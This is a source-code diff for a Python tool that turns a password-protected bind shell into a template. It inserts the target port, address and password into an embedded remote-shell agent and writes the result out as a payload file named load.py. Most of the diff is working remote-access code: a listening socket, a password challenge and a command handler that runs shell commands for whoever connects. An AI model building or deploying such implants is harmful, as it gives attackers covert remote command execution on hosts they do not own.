@@ -1,3 +1,10 @@
+rport = 1234
+rhost = '10.0.10.110'
+password = 'Py314!'
+
+
+
+agent  = '''
 import os
 import socket
 import hashlib
@@ -62,7 +69,7 @@ def serverHandler(channel):
                     # Return empty output, to not block the remote shell
                     output = ' '
                 else:
-                    output = f"{workingDir} doesn'nt exist\n"
+                    output = f"{{workingDir}} doesn'nt exist"
 
                 channel.sendall(output.encode())
 
@@ -80,7 +87,7 @@ def serverHandler(channel):
             exit()
 
         except Exception as error:
-            print(f"[!] {error}")
+            print(f"[!] {{error}}")
             exit()
 
     
@@ -127,9 +134,9 @@ def shellCommand(command, cwd):
 
 BUFFER_SIZE = 1024
 
-bindPort = 1234
-bindAddress = '10.0.10.110'
-password = 'Py314!'
+bindPort = {}
+bindAddress = '{}'
+password = '{}'
 
 
 serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -138,14 +145,14 @@ serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 serverSocket.bind((bindAddress, bindPort))
 serverSocket.listen(5)
 
-print(f"[?] Listening on {bindAddress}:{bindPort}")
+print(f"[?] Listening on {{bindAddress}}:{{bindPort}}")
 
 while True:
 
     try:
 
         channel, cliAddress = serverSocket.accept()
-        print(f"[+] Received Connection from {cliAddress[0]}")
+        print(f"[+] Received Connection from {{cliAddress[0]}}")
         challenge = passwordChallenge(channel, password)
         if challenge is True:
             serverHandler(channel)
@@ -159,7 +166,22 @@ while True:
         
         
     except Exception as error:
-        print(f"[+] {error}")
+        print(f"[!] {{error}}")
         serverSocket.close()
         exit()
+
+'''.format(
+    rport,
+    rhost,
+    password
+)
+
+
+
+outFile = r'/home/scratch/Temp/load.py'
+
+with open(outFile, 'w') as fileStream:
+    fileStream.write(agent)
+
+
 
